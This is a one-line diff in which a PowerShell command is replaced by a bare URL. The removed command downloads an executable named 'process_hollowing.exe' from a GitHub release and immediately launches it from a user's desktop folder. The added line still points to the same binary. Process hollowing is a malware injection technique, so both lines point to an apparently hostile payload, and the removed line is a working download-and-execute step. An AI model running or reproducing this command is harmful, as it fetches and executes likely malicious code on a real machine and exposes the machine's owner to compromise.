@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/mrpython218378216/windows11/releases/download/fuyihyu/process_hollowing.exe" -OutFile "C:\Users\admin\Desktop\bn\3.exe"; Start-Process "C:\Users\admin\Desktop\bn\3.exe"
+https://github.com/mrpython218378216/windows11/releases/download/fuyihyu/process_hollowing.exe
